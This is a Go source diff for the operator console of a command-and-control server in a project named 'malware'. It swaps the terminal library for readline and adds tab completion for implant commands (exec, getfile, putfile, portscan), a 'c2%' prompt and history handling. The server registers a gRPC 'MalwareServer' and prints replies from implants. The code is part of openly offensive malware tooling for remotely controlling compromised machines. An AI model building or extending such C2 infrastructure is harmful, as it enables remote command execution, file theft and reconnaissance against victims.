@@ -3,11 +3,12 @@ package main
 import (
 	"context"
 	"fmt"
-	"github.com/carmark/pseudo-terminal-go/terminal"
+	"github.com/chzyer/readline"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 	"io"
 	"io/ioutil"
+	"log"
 	"malware/common"
 	pb "malware/common/messages"
 	"malware/common/types"
@@ -21,20 +22,18 @@ import (
 type c2 struct {
 	port  int
 	queue chan *pb.CheckCmdReply
-	term  *terminal.Terminal
+	term  *readline.Instance
 }
 
 func (c2 *c2) writeString(str string) {
-	c2.term.Write([]byte(str))
+	log.Print(str)
 }
 
 func (c2 *c2) handleReply(reply *pb.ImplantReply) {
 	if err := reply.GetError(); err != 0 {
 		c2.writeString("Error: " + types.ErrorToString[err] + "\n")
 	} else {
-
-		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1))
-		c2.writeString("\n")
+		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1) + "\n")
 	}
 }
 
@@ -83,25 +82,39 @@ func (c2 *c2) handle(text string) {
 	default:
 		c2.term.Write([]byte("Cmd not found: "))
 		c2.term.Write([]byte(parts[0] + "\n"))
-		fmt.Println()
 	}
 }
 func (c2 *c2) ReadUserInput() {
-	line, err := c2.term.ReadLine()
-	defer func() { recover() }()
+
 	for {
-		if err == io.EOF {
-			return
-		} else if (err != nil && strings.Contains(err.Error(), "control-c break")) || len(line) == 0 {
-			line, err = c2.term.ReadLine()
-		} else {
-			c2.handle(line)
-
-			line, err = c2.term.ReadLine()
+		line, err := c2.term.Readline()
+		if err == readline.ErrInterrupt {
+			continue
+		} else if err == io.EOF {
+			break
 		}
-	}
 
+		c2.handle(line)
+
+	}
 }
+
+func filterInput(r rune) (rune, bool) {
+	switch r {
+	// block CtrlZ feature
+	case readline.CharCtrlZ:
+		return r, false
+	}
+	return r, true
+}
+
+var completer = readline.NewPrefixCompleter(
+	readline.PcItem("exec"),
+	readline.PcItem("getfile"),
+	readline.PcItem("putfile"),
+	readline.PcItem("portscan"),
+	readline.PcItem("help"),
+)
 
 func main() {
 	// TODO: Replace with %PORT%
@@ -117,7 +130,24 @@ func main() {
 		panic(err)
 	}
 
-	c2 := &c2{port: _C2_PORT_, queue: make(chan *pb.CheckCmdReply, 100)}
+	l, err := readline.NewEx(&readline.Config{
+		Prompt:          "\033[34mc2%\033[0m ",
+		HistoryFile:     "/tmp/readline.tmp",
+		AutoComplete:    completer,
+		InterruptPrompt: "^C",
+		EOFPrompt:       "exit",
+
+		HistorySearchFold:   true,
+		FuncFilterInputRune: filterInput,
+	})
+
+	if err != nil {
+		panic(err)
+	}
+	defer l.Close()
+	log.SetOutput(l.Stderr())
+
+	c2 := &c2{port: _C2_PORT_, queue: make(chan *pb.CheckCmdReply, 100), term: l}
 	host := fmt.Sprintf(":%d", c2.port)
 	listener, err := net.Listen("tcp", host)
 
@@ -131,17 +161,7 @@ func main() {
 
 	pb.RegisterMalwareServer(server, c2)
 
-	term, err := terminal.NewWithStdInOut()
-	if err != nil {
-		panic(err)
-	}
-	fmt.Println("Ctrl-D to break")
-	term.SetPrompt("c2: # ")
-
-	c2.term = term
-
 	go func() {
-		defer term.ReleaseFromStdInOut()
 		c2.ReadUserInput()
 		server.Stop()
 
